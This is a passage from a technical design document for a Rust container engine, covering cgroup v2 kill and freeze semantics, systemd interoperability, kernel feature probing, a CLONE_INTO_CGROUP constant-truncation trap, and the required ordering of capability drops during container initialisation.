**Fact — why walking `cgroup.procs` and signalling each PID is racy**, in three independent
ways:

1. A process can `fork()` between our `read()` and our `kill()`. Loop-until-empty fixes this
   only probabilistically; a tight fork loop can outrun the reader.
2. A PID we read may already be recycled. The kernel documentation states this on the read side
   itself: *"The PIDs are not ordered and the same PID may show up more than once if the process
   got moved to another cgroup and then back **or the PID got recycled while reading**"*
   (`cgroup-v2.rst`, `cgroup.procs`). `pidfd_open(2)` shrinks the window rather than closing it
   — you are still resolving a *number* to a process. The only race-free handle is one obtained
   at creation, via `clone(CLONE_PIDFD)`.
3. The decisive one: **with a shared PID namespace (`--pid=host`, or any `pidNamespace`-less OCI
   config), the walk signals host PIDs by number.** A recycled PID there is not an unrelated
   process inside the container; it is an unrelated *host* process, SIGKILLed by a daemon running
   as root. `cgroup.kill` cannot do this by construction, because it never names a PID. This is a
   stronger reason to require `cgroup.kill` than the fork race is.

#### Freezing, and why thawing after a kill is harmful

**Fact.** `cgroup.freeze` landed in **Linux 5.2** for cgroup v2 (v1's `freezer` controller is a
separate, older thing). Writing `1` freezes the cgroup and all descendants; the operation is
**asynchronous**, so the write returns before tasks have stopped and `cgroup.events`'s `frozen`
field is the completion signal. Processes can still be killed while frozen, and can still be
moved in and out.

**Trap.** `cgroup.freeze` is 5.2, not 4.19. A probe table carrying 4.19 will attempt a freeze on
4.19–5.1 kernels and get `ENOENT`.

**Fact.** A `SIGKILL` delivered to a frozen task takes effect **while the cgroup is still
frozen**. `get_signal()` reaches its `fatal:` label and calls `cgroup_leave_frozen(true)`
unconditionally before taking the fatal action
(`torvalds/linux@v6.17/kernel/signal.c#L2997-L3000`), and `cgroup_leave_frozen(true)` clears
`current->frozen` and decrements the frozen count regardless of `CGRP_FREEZE`
(`kernel/cgroup/freezer.c#L128-L146`).

**Recommendation.** Therefore **never thaw after a kill**. Thawing re-enables `fork()` for
anything the walk missed — precisely the case the freeze existed to prevent — reopening the race
in the window between the last `kill()` and the last exit. Staying frozen is self-reinforcing:
`cgroup_post_fork()` propagates `JOBCTL_TRAP_FREEZE` to children born into a frozen cgroup
(`cgroup.c#L6796-L6804`). The corrected fallback for kernels without `cgroup.kill`:

```
write("cgroup.freeze", "1")              # >= 5.2
poll cgroup.events until frozen == 1     # the freeze is asynchronous
loop:
    pids = read("cgroup.procs")
    if pids empty: break
    for pid in pids: kill(pid, SIGKILL)  # frozen tasks still die
poll cgroup.events until populated == 0
rmdir                                    # never thaw; the cgroup is going away
```

The loop-until-empty is still needed: a task mid-`fork()` when the freeze landed may complete
it, and the kernel documentation says freezing "may take some time" and explicitly allows
`fork()` to race it.

**Recommendation.** `cgroup.freeze` is also `pause`/`unpause`, two writes and one poll, and is
worth implementing for that alone. One trap to design around: **a frozen container cannot
respond to `SIGTERM`**, so `stop` must thaw first or refuse with an error naming `unpause`.

#### Why a graceful stop burns the whole grace period

**Fact.** `pid_namespaces(7)`, verbatim: *"Only signals for which the 'init' process has
established a signal handler can be sent to the 'init' process by other members of the PID
namespace. … Likewise, a process in an ancestor namespace can … send signals to the 'init'
process of a child PID namespace only if the 'init' process has established a handler for that
signal. … SIGKILL or SIGSTOP are treated exceptionally: these signals are forcibly delivered
when sent from an ancestor PID namespace."*

So `SIGTERM` sent from the host to a container PID 1 that installed no `SIGTERM` handler is
**discarded by the kernel** — `kill(2)` returns 0 and nothing happens. This, not signal
forwarding, is the *first* reason a graceful stop runs out the clock.

**Fact.** The second reason is forwarding: a shell-form `CMD` can make `/bin/sh -c "…"` PID 1,
and `sh` does not forward `SIGTERM` to its child. **Trap in the other direction:** both `dash`
and `bash` exec-optimise `sh -c "<single simple command>"`, so the common
`CMD nginx -g 'daemon off;'` shell form *does* end up with `nginx` as PID 1 and *does* stop
cleanly. The failure is specific to shell forms the shell cannot exec away — `a && b`,
redirections, expansions that force a subshell. "Every shell-form stop is a SIGKILL" is an
overstatement.

**Fact.** When PID 1 of a PID namespace dies, the kernel SIGKILLs every other process in that
namespace and `fork` in it then returns `ENOMEM`. That covers only processes *in that
namespace*: a process that `unshare`d into a different PID namespace, or one that `setns`'d
elsewhere, survives — as does everything, on the host, if the container was created without a
PID namespace at all.

**Recommendation — our stop sequence.**

```
1. thaw if frozen                        (else the stop signal is a no-op)
2. record memory.events:oom_kill/max/oom (the §12.4 baseline)
3. send the stop signal to PID 1 ONLY, through a pidfd from clone(CLONE_PIDFD)
4. wait for PID 1's pidfd to become readable, with the grace timeout
5. on timeout: cgroup.kill  (or the frozen fallback above)
6. poll cgroup.events:populated until 0
7. reap, read final stats, rmdir the cgroup (retry on EBUSY)
```

Two decisions in that sequence are worth defending. **The stop signal stays PID-1-directed**:
broadcasting `SIGTERM` to every task in the cgroup is something `docker kill --signal`
deliberately does not do, and it produces worse outcomes than the grace period for a worker pool
whose supervisor is mid-drain. **Every forcible step goes through the cgroup**: never
`kill(pid1, SIGKILL)` as the escalation, because in a shared PID namespace that kills exactly one
process. And the two waits are two different events: **exit status comes from PID 1's pidfd;
teardown completion comes from `cgroup.events:populated`.** Conflating them is what makes both
Docker's semantics and the naive implementation awkward — report the container stopped when PID 1
is reaped, and schedule the cgroup drain asynchronously.

**Recommendation.** Obtain PID 1's pidfd from `clone(CLONE_PIDFD)` at creation and never store a
bare PID for signalling. One extra field in the container state removes an entire race class and
yields a pollable exit notification, which is what step 4 wants and what otherwise requires
`SIGCHLD` plumbing or a `waitpid` thread.

### 12.6 systemd as an interoperability constraint

**Fact.** On a host where systemd is PID 1 and cgroup v2 is unified, systemd considers itself
the sole owner of the hierarchy and documents a single-writer rule: a process may modify only
cgroups it owns or that were delegated to it. systemd reconciles the tree against its unit
configuration and can move or delete cgroups it does not know about
(`systemd.resource-control(5)`).

**Convention.** runc therefore ships two cgroup managers — an `fs` driver that `mkdir`s under
`/sys/fs/cgroup/<parent>/<id>` and writes control files directly, and a `systemd` driver that
asks `org.freedesktop.systemd1` over D-Bus for a transient scope unit. The split exists for
coexistence only: anything the `fs` driver creates is invisible to `systemctl`, mis-accounted by
`systemd-cgtop`, and can be garbage-collected by a slice restart.

**Convention — what the systemd driver actually asks for.** The transient unit file for a live
Docker container, `/run/systemd/transient/docker-<id>.scope`, verbatim:

```ini
[Scope]
Slice=system.slice
Delegate=yes
MemoryAccounting=yes
CPUAccounting=yes
IOAccounting=yes
TasksAccounting=yes

[Unit]
DefaultDependencies=no
```

`Delegate=yes` plus nothing but `*Accounting=yes` means runc asks systemd to create the scope
and then **hands the subtree back to runc**, which writes the control files itself. Confirmed in
source: `runc@v1.2.5/libcontainer/cgroups/systemd/v2.go#genV2ResourcesProperties` emits a small
fixed property set (`MemoryMax`, `CPUWeight`, `CPUQuotaPerSecUSec`, `TasksMax`, `AllowedCPUs`,
`AllowedMemoryNodes`, device properties) and the `fs2` manager runs afterwards for everything
else.

**Recommendation.** Implement the `fs` driver first, into **our own top-level subtree**
(`/sys/fs/cgroup/<engine-name>/`), not under `system.slice`, with the `CgroupManager` trait in
place from day one. Three reasons in order of weight: the `fs` driver is where the mechanism
lives and is what the project exists to own; it has no runtime dependency (no D-Bus, no systemd,
works in CI and in a minimal VM); and the failure mode of `fs`-on-systemd is invisibility plus a
garbage-collection risk rather than immediate breakage. The cheap correct compromise is one
`.slice` unit with `Delegate=yes`, shipped with the engine and created once at install time, and
zero D-Bus code in the engine — which is exactly what the transient-scope artefact above shows
runc itself settling for. Tradeoff accepted: `systemctl status` will not show our containers,
`systemd-cgtop` attributes usage to our top-level cgroup, and an admin's `system.slice` ceiling
does not apply to us — which is both the feature and the bug. **The systemd driver is the single
largest piece of complexity in the resource subsystem that we can defer, and the trait is what
keeps it an addition rather than a rewrite.**

#### `DefaultTasksMax` is a per-host computation, not a constant

**Fact.** systemd's `DefaultTasksMax` is *"15% of the minimum of `kernel.pid_max=`,
`kernel.threads-max=` **and root cgroup `pids.max`**"* (`systemd@v257/man/systemd-system.conf.xml`),
implemented as `#define DEFAULT_TASKS_MAX ((CGroupTasksMax) { 15U, 100U })`
(`src/core/manager.c#L120`) resolved through `system_tasks_max()`
(`src/basic/limits-util.c#L113-L160`), which takes
`min(procfs_get_threads_max(), procfs_get_pid_max() - 1, root cgroup pids.max)`. The man page
quotes **4915** as the default "with the default `kernel.pid_max=`".

**Fact.** Measured on one Ubuntu 24.10 host: `kernel.pid_max = 4194304`,
`kernel.threads-max = 127653`, `/sys/fs/cgroup/pids.max` does not exist (a v2 unified root has
none). So `min = 127653`, `× 15 / 100 = 19147` — and every live Docker scope on that host read
`pids.max = 19147` despite Docker having been asked for no pids limit. **That number is a
coincidence of a modern `pid_max`.** On a host with the historical `pid_max = 32768` the same
formula yields 4915, a 4× difference; `/etc/systemd/system.conf` carries `#DefaultTasksMax=15%`
commented out, so an admin may set it to anything including `infinity`; and user slices get a
different figure entirely — **33%**, from systemd's shipped drop-in
`units/user-.slice.d/10-defaults.conf`.

**Convention.** Docker sets no pids limit by default.
`moby@v28.3.1/daemon/daemon_unix.go#L125-L136`:

```go
func getPidsLimit(config containertypes.Resources) *specs.LinuxPids {
    if config.PidsLimit == nil { return nil }       // user said nothing ⇒ nothing in the spec
    if *config.PidsLimit <= 0 { return &specs.LinuxPids{Limit: -1} }
    return &specs.LinuxPids{Limit: *config.PidsLimit}
}
```

`PidsLimit` is `*int64` and `nil` by default, so the OCI spec carries no `linux.resources.pids`
and runc writes nothing. Unchanged at `moby@docker-v29.9.2`. Docker's fork-bomb protection on a
systemd host is therefore an accident of `TasksAccounting=yes`, and a bare `fs` driver has none
at all.

**Recommendation.** Set our own default `pids.max`, document it as ours, and make it a function
of nothing an admin can move: a fork-bomb ceiling that varies by a factor of ten across hosts is
not a ceiling. `min(4096, 15% × kernel.threads-max)` is a defensible number — the same order as
systemd's on small hosts, capped so a 256-core machine does not hand every container 100k tasks.
It must be overridable and the error on hitting it must name the knob, because 2048 is tight for
a JVM with a large thread pool and for a Go runtime with `GOMAXPROCS` on a big box plus cgo
threads.

#### Device policy is intersected with programs we do not control

**Fact.** cgroup v2 has no `devices` controller. Device access is a
`BPF_PROG_TYPE_CGROUP_DEVICE` program attached with
`bpf(BPF_PROG_ATTACH, BPF_CGROUP_DEVICE, …)` (**Linux 4.15**). With `BPF_F_ALLOW_MULTI`, the
kernel runs the **whole effective array** and a single `0` denies:
`bpf_prog_run_array_cg()` does `if (!func_ret && …) run_ctx.retval = -EPERM;` with no
short-circuit (`torvalds/linux@v6.17/kernel/bpf/cgroup.c#L60-L93`). Access is the intersection.

**Fact.** The effective array is `cgrp->bpf.effective[atype]`, which under `BPF_F_ALLOW_MULTI`
includes programs attached at **every ancestor cgroup**, not only at the leaf. Measured on a
systemd host, every Docker scope has two attached programs — runc's (unnamed, tag
`ab4bc4523b7fe6b4`, byte-identical across containers) and systemd's `sd_devices` — and an admin
program at `system.slice` or at the root would be invisibly intersected in as well. runc's own
source flags this as uncomfortable: *"This is of questionable correctness because we insert our
own devices eBPF program later … it's unclear if systemd removes all eBPF programs attached when
doing SetUnitProperties"* (`runc@v1.2.5/libcontainer/cgroups/systemd/v2.go#L212-L216`).

**Recommendation.** A second, independent argument for a top-level subtree systemd does not
manage: a cgroup under our own root has no systemd program above it, so our device policy is our
device policy. And our diagnostics must enumerate the attached `cgroup_device` programs on the
container's cgroup **and its ancestors** via `bpf(BPF_PROG_QUERY)` — "your `--device` was
accepted and the device still does not work" is otherwise undiagnosable.

### 12.7 Detection, and the no-writable-cgroup case

**Fact.** The authoritative version test is the filesystem magic on the cgroup mount point, via
`statfs(2)` (magics from `torvalds/linux@v6.17/include/uapi/linux/magic.h`):

| magic | constant | meaning |
|---|---|---|
| `0x63677270` | `CGROUP2_SUPER_MAGIC` | `/sys/fs/cgroup` is cgroup v2 → **unified** |
| `0x01021994` | `TMPFS_MAGIC` | tmpfs with v1 controllers mounted under it → legacy or hybrid |

If tmpfs, then `statfs("/sys/fs/cgroup/unified")` returning `CGROUP2_SUPER_MAGIC` means hybrid;
otherwise legacy v1 only. This is runc's `IsCgroup2UnifiedMode()` / `IsCgroup2HybridMode()`
(`runc@v1.2.5/libcontainer/cgroups/utils.go#L33-L67`).

**Trap — and it is not hypothetical.** Do **not** detect by parsing `/proc/self/cgroup`. The
kernel emits the `0::/` unified line whenever `CONFIG_CGROUP` is on, mounted or not. Measured on
a Rocky 8.8 host with v1 controllers only and no v2 mount anywhere, `/proc/self/cgroup` still
ends with `0::/`. A runtime that concludes "v2 is available" from that line then tries to write
to a read-only tmpfs. The sharp form of the rule: **never use `/proc/self/cgroup` for
*detection*; always use its `0::` line for *location*** — once `statfs` has established that v2
is mounted, that line is the right source for which cgroup we are in.

**Recommendation.** Do not detect by checking `/proc/filesystems` for `cgroup2` (the kernel
supports it, nobody mounted it) and never by kernel version (§12.8).

**Fact.** runc treats a `statfs` failure specially: `os.IsNotExist(err) && RunningInUserNS()` is
downgraded to a debug log — i.e. it explicitly expects `/sys/fs/cgroup` to be absent in a
rootless context. Our probe should do the same rather than treating absence as an error.

**Recommendation — drop cgroup v1 entirely.** It roughly doubles the subsystem (a second
filename map, a second stats parser, a second mount-discovery path parsing `/proc/self/mountinfo`
per controller, a second delegation story, the `memsw` arithmetic), its rootless story is
structurally broken rather than merely harder (the per-controller trees are not aligned, so there
is no single subtree to delegate, and there is no `nsdelegate` equivalent), and it carries an
active escape class that v2 does not — `release_agent` and `notify_on_release` were **removed by
design** from v2, not merely left unexploited (`torvalds/linux@v6.17/kernel/cgroup/cgroup.c#L330`:
*"'release_agent' and 'notify_on_release' are removed"*; the field survives only on
`struct cgroup_root` for cgroup1 mounts). Every distribution that matters boots unified: Fedora
31+, Ubuntu 21.10+, Debian 11+, RHEL/Rocky/Alma 9+, Arch, SUSE 15.3+. The remaining audience is
RHEL 8, and on the one RHEL 8 host measured, a full v1 implementation would buy **zero**
additional capability — every controller root is mode `555`,
`mkdir /sys/fs/cgroup/memory/test` returns `EACCES`, and `mount -t cgroup2` inside a user
namespace returns `EPERM`.

**Recommendation — the four tiers, which must be distinguishable in the CLI:**

| situation | behaviour |
|---|---|
| v2 unified, writable subtree, controllers enabled | full limits |
| v2 unified, writable subtree, **controller absent from the parent's `subtree_control`** | the limit *file does not exist*; refuse the requested limit with a message naming the controller and the one-line admin fix (`+io` in the parent). This is the common rootless case, not an exotic one |
| v2 unified, **no writable subtree** | run the container; refuse any explicitly requested limit, naming the missing delegation; apply no silent partial limits |
| v1, or no writable cgroup at all | run the container; refuse any requested limit naming the cause; `info` reports `cgroups: v1 (unsupported, no limits)` or `cgroups: none (no limits enforceable)` |

**Recommendation — the rule the tiers exist to express: a requested limit that cannot be applied
is a hard error; a defaulted one that cannot be applied is a logged note.** The failure being
avoided is the one that has bitten every rootless-container user: `--memory=512m` accepted, never
enforced, and the host OOMs three weeks later.

**Recommendation.** This forces two type-level decisions that are nearly free now and expensive
later. First, `Option<u64>` where `None` means "the user said nothing" — Docker's API uses `0`
for both "unlimited" and "unspecified", which is precisely why Docker cannot produce the error
above. Second, every operation that can fail for privilege reasons returns three values, not two:
`Applied`, `Skipped(reason)`, `Failed(err)`. `Skipped` is what a defaulted limit does; `Failed`
is what a requested one does.

### 12.8 Kernel versions — the corrected table, and the floor

**Fact.** Feature arrival dates, bisected against the kernel documentation and source. The rows
marked ✗ are corrections to figures that were wrong in the earlier research and would, if
carried into a probe table or a floor justification, mislead:

| feature | upstream | note |
|---|---|---|
| cgroup v2 usable / cgroup namespace | 4.5 / 4.6 | required |
| `nsdelegate` mount option | 4.13 | makes a cgroupns a delegation boundary |
| `BPF_PROG_TYPE_CGROUP_DEVICE` | 4.15 | the only device control on v2 |
| `memory.oom.group` | **4.19** ✗ (not 5.10) | |
| PSI (`*.pressure`) | 4.20 | needs `CONFIG_PSI=y`; absent on RHEL 8 |
| `cpuset.cpus.partition` | **5.0** ✗ (not 5.17) | the `isolated` type and extra states arrive at 6.2 |
| `pidfd_send_signal` | 5.1 | |
| `cgroup.freeze`, `CLONE_PIDFD` | **5.2** ✗ (freeze is not 4.19) | |
| `memory.events.local`, `clone3`, `pidfd_open` | **5.3** ✗ (`.local` is not 5.13) | |
| `openat2` (`RESOLVE_*`) | 5.6 | deletes ~300 lines of hand-rolled symlink-safe resolution |
| `memory_recursiveprot`, `CLONE_INTO_CGROUP` | 5.7 | |
| `CAP_BPF` / `CAP_PERFMON` split from `CAP_SYS_ADMIN` | 5.8 | |
| `close_range(2)` | 5.9 (`CLOSE_RANGE_CLOEXEC` 5.11) | |
| `MS_NOSYMFOLLOW` | 5.10 | |
| unprivileged overlayfs in userns + `userxattr` | 5.11 | one series, both halves |
| idmapped mounts (`mount_setattr` + `MOUNT_ATTR_IDMAP`) | 5.12 | |
| Landlock | 5.13 | §13.8 |
| `cgroup.kill`, `cpu.max.burst` | 5.14 | |
| `memory.peak`, `memory.reclaim` | 5.19 | |
| `cgroup.pressure`, `pids.peak` | 6.1 | `pids.peak` is in `kernel/cgroup/pids.c` at 6.1; the *documentation* only catches up at 6.11 |
| `cgroup.kill` fork-race via `kill_seq` instead of `CGRP_KILL` | 6.14 | §12.5's trap |

**Recommendation — the floor is 5.15.** The corrections remove two of the previously stated
justifications (`memory.events.local` is already present at 5.10, and `memory.oom.group` at
4.19) without moving the number, because what 5.15 actually buys over 5.10 is exactly two things
that change *architecture* rather than the feature list: **`cgroup.kill` (5.14)**, which removes
a race class, and **idmapped mounts (5.12)**, which removes an entire uid-shifting subsystem.
Everything 6.1 adds is telemetry. 5.10 remains a coherent "probably works" tier — it has
`openat2`, `close_range`, `cgroup.freeze`, `CLONE_PIDFD`, `CLONE_INTO_CGROUP`, the `CAP_BPF`
split and `MS_NOSYMFOLLOW` — but it should be labelled **untested and unsupported**, not "hard
floor", because that phrase invites someone to target it. RHEL 8 at 4.18 is explicitly out of
scope.

**Recommendation — probe, never version-sniff, and this is the most load-bearing rule in the
section.** Measured on Rocky 8.8 / 4.18.0-425: `openat2` present (backported), `faccessat2`
present, `pidfd_send_signal` present, `cap_last_cap = 40` (a 5.9-era capability space),
overlayfs-in-userns working — while `clone3` is `ENOSYS`, `pidfd_open` is `ENOSYS`, and PSI does
not exist. No version comparison predicts that set. The probe recipe:

- **syscalls** — issue the call with deliberately invalid arguments and treat `ENOSYS` as
  absent, any other errno as present. Never with valid arguments; the probe must not succeed at
  doing something.
- **cgroup features** — `access(2)`/`stat(2)` the control file (`cgroup.kill`, `cgroup.freeze`,
  `memory.peak`).
- **cgroup delegation set and mount options** — read `/sys/kernel/cgroup/delegate` and
  `/sys/kernel/cgroup/features`. These are the kernel's own probe interface for this subsystem.
- **mount features** — attempt the mount, classify the errno.
- **capabilities** — `/proc/sys/kernel/cap_last_cap`.
- **LSMs** — `/sys/kernel/security/lsm`, `/sys/module/apparmor/parameters/enabled`,
  `/sys/fs/selinux`; Landlock by its ABI-version call (§13.8).

Cache the results once per daemon start in one `KernelFeatures` value. **That struct is the only
place in the engine where kernel-version dependence is allowed to live.** Everything else asks it.

### 12.9 `CLONE_INTO_CGROUP` — a correctness trap at the Rust boundary

**Fact.** The classic placement sequence has a window: `clone()` returns, and the child exists
*outside* its intended cgroup until the parent writes its PID to `cgroup.procs`. `clone3(2)`
with `CLONE_INTO_CGROUP` and `struct clone_args.cgroup` set to a directory fd creates the child
directly in the target (**Linux 5.7**; `clone3` itself 5.3).

**Fact.** Three constraints the kernel states and that the obvious implementation gets wrong
(`cgroup_css_set_fork()`, `torvalds/linux@v6.17/kernel/cgroup/cgroup.c#L6596-L6650`): the fd
must be a **directory** fd — `O_PATH` is acceptable, a `cgroup.procs` fd is *never* accepted, by
design, so that spawning into a cgroup is conceptualised as an atomic open-and-write using **the
caller's** credentials; a dead target gives **`ENODEV`**; and the permission check is the same
`cgroup_attach_permissions()` the ordinary `cgroup.procs` write path uses, so the destination's
own `subtree_control` must be empty or the call returns `EBUSY`. `CLONE_INTO_CGROUP` also
requires `clone_args` to be at least `CLONE_ARGS_SIZE_VER2`; a short struct returns `EINVAL`.

**Trap.** `CLONE_INTO_CGROUP` **relaxes nothing** about the no-internal-process rule. The
constraint has never applied to the destination's *parent* — writing a PID into a leaf whose
parent has controllers enabled is legal through the ordinary path too, and is exactly the §12.1
layout. Believing otherwise makes `CLONE_INTO_CGROUP` look like a prerequisite for that layout.
It is not.

**Trap — the one that silently breaks resource control.** On every glibc Rust target,
`libc::CLONE_INTO_CGROUP` is declared `c_int` with value `0x200000000`. `c_int` is `i32` on
every Linux target and `0x200000000` is 2³³, so the constant **truncates to zero** and compiles
with a deprecation allow (`libc` 0.2.191, issue #3584, fixed only on `main`). On musl targets the
constant does not exist at all. The consequence is the worst possible failure signature:
`args.flags = … | libc::CLONE_INTO_CGROUP as u64` ORs in **zero**, `clone3` succeeds, returns a
PID, and the child lands in the **parent's** cgroup — unaccounted and unlimited — with no error
to catch anywhere. It will be blamed on cgroup delegation for a week.

**Recommendation.** Define it ourselves and refuse the deprecated path:

```rust
// linux/sched.h. NOT libc::CLONE_INTO_CGROUP: that constant is c_int on glibc
// targets, truncates to 0, and is absent on musl.
const CLONE_INTO_CGROUP: u64 = 1 << 33;   // 0x200000000
```

and set `#![deny(deprecated)]` in the core crate. The same defect applies to
`CLONE_CLEAR_SIGHAND` (2³²). `CLONE_PIDFD` is unaffected — it is `0x1000`, in range.

**Recommendation.** Treat `CLONE_INTO_CGROUP` as an optional optimisation and never as the
correctness-bearing path. The window it closes is narrow: in our design the child between
`clone()` and the PID write does nothing except block on a synchronisation pipe, and has not yet
`execve`'d the user's entrypoint, so a fork bomb cannot start there. The pipe-synchronised
sequence —

```
create cgroup → apply limits → clone child (child blocks on a pipe)
   → write child pid to cgroup.procs → verify → release the pipe → child execve's
```

— is the only path that must be correct, and it works on every supported kernel. The lazy answer
here is also the safe one.

### What this decides

| decision | urgency |
|---|---|
| `fs` cgroup driver into our own top-level subtree, `CgroupManager` trait from day one; systemd driver deferred until someone reports needing `systemctl` visibility | **urgent** — the trait boundary is cheap now and a rewrite later |
| The `--cpu-shares` → `cpu.weight` conversion (runc's formula) lives **above** the driver trait, in `Resources` translation | **urgent** — same reason; it is what makes a second driver an addition |
| `Option<u64>` for every limit (`None` ≠ `0`) and a three-valued `Applied`/`Skipped`/`Failed` result | **urgent** — API-visible type change if deferred |
| Set our own default `pids.max`; do not inherit systemd's accidental backstop | deferrable but one line |
| Kernel floor 5.15 documented, 5.10 "untested, unsupported", 4.18/RHEL 8 out of scope | **urgent** — it determines how many fallback paths get written |
| One `KernelFeatures` struct built by probing at daemon start; no other kernel-version logic anywhere | **urgent** |
| Hand-define `CLONE_INTO_CGROUP` and `#![deny(deprecated)]`; keep the pipe-synchronised placement as the only correctness path | **urgent** — the failure is silent |
| Read `/sys/kernel/cgroup/delegate` rather than hard-coding the delegated file set | deferrable |
| Never thaw after a kill; `cgroup.kill` re-issued until `populated == 0` | deferrable but free |
| Drop cgroup v1 entirely; four distinguishable degradation tiers in `info` and in errors | **urgent** — it halves the subsystem |

---

## 13. Security model

A default container's entire security boundary is a capability bounding set, a seccomp filter,
an LSM profile, a `/proc`–`/sys` policy, a device program, and no leaked file descriptors.
Remove any one and most of the others stop being load-bearing. This section is the mechanics of
each, the order they must be applied in — which is where the most expensive bug in this area
lives — and the escape classes they exist to close.

### 13.1 Capabilities

**Fact.** `capabilities(7)` defines five per-thread sets:

| set | definition (verbatim) |
|---|---|
| **Permitted** (`CapPrm`) | *"a limiting superset for the effective capabilities that the thread may assume"*, and for what may be added to inheritable |
| **Inheritable** (`CapInh`) | *"a set of capabilities preserved across an `execve(2)`"* |
| **Effective** (`CapEff`) | *"the set of capabilities used by the kernel to perform permission checks for the thread"* |
| **Bounding** (`CapBnd`) | *"a mechanism that can be used to limit the capabilities that are gained during `execve(2)`"* |
| **Ambient** (`CapAmb`) | *"a set of capabilities that are preserved across an `execve(2)` of a program that is not privileged"* (4.3+); invariant: nothing can be ambient unless it is both permitted **and** inheritable |

**Fact.** The `execve(2)` transformation, verbatim:

```
P'(ambient)     = (file is privileged) ? 0 : P(ambient)
P'(permitted)   = (P(inheritable) & F(inheritable)) |
                  (F(permitted) & P(bounding)) | P'(ambient)
P'(effective)   = F(effective) ? P'(permitted) : P'(ambient)
P'(inheritable) = P(inheritable)    [unchanged]
P'(bounding)    = P(bounding)       [unchanged]
```

`P(permitted)` does not appear on the right-hand side. The permitted set held before `execve`
is **not** carried over; the new one is assembled from the file's sets, the inheritable set and
the ambient set, all clamped by bounding. Two consequences follow immediately:

1. **Dropping from permitted or effective is not durable.** It survives only until the next
   `execve` of a file carrying capabilities, at which point `F(permitted) & P(bounding)` can
   hand the capability straight back.
2. **Dropping from bounding is durable and irreversible.** Once dropped via
   `prctl(PR_CAPBSET_DROP)` it *"cannot be restored to that set"*, and because bounding masks
   `F(permitted)` in the formula, an absent capability can never re-enter permitted from a file
   capability — in this process or any descendant.

**Fact — the root special case, stated exactly.** *"(1) If the **real or effective** user ID of
the process is 0 (root), then the file inheritable and permitted sets are ignored; instead they
are notionally considered to be all ones. (2) If the **effective** user ID of the process is 0
… then the file effective bit is notionally defined to be one."* The calculation simplifies to:

```
P'(permitted) = P(inheritable) | P(bounding)
P'(effective) = P'(permitted)
```

**Trap.** That is `P(inheritable) | P(bounding)`, **not** `P(bounding)`. "The bounding set is
the whole capability policy" is true only while inheritable is empty — which it is for Docker
and should be for us, but `capset(2)`'s own rules permit an already-held inheritable bit to
survive a later bounding drop (the constraint is "subset of existing inheritable ∪ bounding").
**Recommendation.** Clear inheritable explicitly before dropping bounding, and assert it stayed
clear. One line, and without it a non-empty inheritable set silently reopens the policy.

**Fact.** `setuid(2)` from uid 0 to non-zero **clears the permitted and effective sets** unless
`PR_SET_KEEPCAPS` / `SECBIT_KEEP_CAPS` is set. And `PR_SET_KEEPCAPS` preserves **permitted
only**: `capabilities(7)` says so in terms — *"Note that even with the `SECBIT_KEEP_CAPS` flag
set, the effective capabilities of a thread are cleared when it switches its effective UID to a
nonzero value."*

#### The ordering — and why getting it backwards survives every smoke test

**Fact.** `prctl(PR_CAPBSET_DROP)` requires `CAP_SETPCAP` in the **effective** set:
`PR_CAPBSET_DROP(2const)` ERRORS — *"**EPERM** The caller does not have the `CAP_SETPCAP`
capability"*, and the kernel's `capable()` tests effective.

Put those two facts together and the obvious sequence — keep caps, change ids, then drop the
bounding set — **cannot work**. After `setresuid(uid, uid, uid)` with a non-zero uid, `CapEff`
is zero, `CAP_SETPCAP` is not effective, and every `PR_CAPBSET_DROP` returns `EPERM`.

**Trap, and this is why the bug is expensive.** For a `USER root` container the euid never
leaves 0, effective is preserved, and the sequence works perfectly. It fails **only** for
non-root container users — the case where capability confinement matters most. And it fails as
`EPERM` on a `prctl` that a reasonable implementation logs and continues past, leaving the
container running with the **host's full bounding set**. Every smoke test passes.

**Convention.** runc does it the other way round, with the comment spelling out why
(`runc@v1.2.5/libcontainer/init_linux.go#L326-L362`, `finalizeNamespace()`):

```go
w, err := capabilities.New(caps)
// drop capabilities in bounding set before changing user
if err := w.ApplyBoundingSet(); err != nil { ... }
// preserve existing capabilities while we change users
if err := system.SetKeepCaps(); err != nil { ... }
if err := setupUser(config); err != nil { ... }      // setgroups/setgid/setuid
if err := system.ClearKeepCaps(); err != nil { ... }
if err := w.ApplyCaps(); err != nil { ... }          // capset: prm/eff/inh/ambient
```

**Recommendation — the corrected sequence for our container init, in full:**

```
 1. for cap not in wanted: prctl(PR_CAPBSET_DROP, cap)   # euid still 0 ⇒ CAP_SETPCAP effective
 2. capset(): inheritable = {}                           # close the inheritable hole first
 3. prctl(PR_SET_KEEPCAPS, 1)                            # preserves PERMITTED across the uid change
 4. setgroups(supplementary)                             # needs CAP_SETGID; must precede setgid
 5. setresgid(gid, gid, gid)
 6. setresuid(uid, uid, uid)                             # euid 0→nonzero: EFFECTIVE is wiped here
 7. prctl(PR_SET_KEEPCAPS, 0)
 8. capset(): permitted = effective = wanted; inheritable = ambient_wanted
 9. for cap in ambient_wanted: prctl(PR_CAP_AMBIENT_RAISE, cap)
10. LSM exec label, if any                               # §13.8: before no_new_privs
11. prctl(PR_SET_NO_NEW_PRIVS, 1)
12. seccomp filter install                               # §13.2
13. execve(entrypoint)
```

Why each position is forced:

- **1 before 6** — `PR_CAPBSET_DROP` needs effective `CAP_SETPCAP`, which step 6 destroys.
- **8 after 7** — `capset` is what un-does the kernel's effective-set wipe, restoring effective
  from the permitted set `KEEPCAPS` preserved. It needs no capability to do so:
  `capabilities(7)` requires only that the new permitted be a subset of the existing permitted
  and the new effective a subset of the new permitted.
- **9 after 8** — the ambient invariant is *"no capability can ever be ambient if it is not both
  permitted and inheritable"*, so step 8 must place the ambient candidates into inheritable.
  Raise into inheritable only what is actually going ambient, which is usually nothing; raising
  the whole wanted set into inheritable is gratuitous and reopens the §13.1 hole above.
- **4 before 5 before 6** — `setgroups` needs `CAP_SETGID`; dropping uid is what loses
  privilege, so it goes last of the three.
- **11 before 12** — `seccomp(2)` requires either `CAP_SYS_ADMIN` or `no_new_privs` (§13.2).

**Trap.** The common claim that bounding must be dropped first "because `capset` clamps to
bounding" is imprecise: only the **inheritable** set is clamped by bounding; the new permitted
set is clamped by the *existing permitted*, which bounding does not touch. The conclusion is
right; the reason is the `CAP_SETPCAP` requirement, and a reader who re-derives from the wrong
reason will reach a wrong conclusion about step 8.

**Recommendation — this sequence is ours and no library may own it.** Whatever capability
library the implementation uses, the thirteen steps above are written out explicitly in our
code, in that order, with the `EPERM` from each step treated as fatal rather than logged. Two
independent reasons. First, the ordering is the part that is wrong in the obvious
implementation, and a library that offers a tidy "apply these capabilities" call will apply them
in *its* order. Second, the steps run in the post-`clone`, pre-`execve` child, where allocation
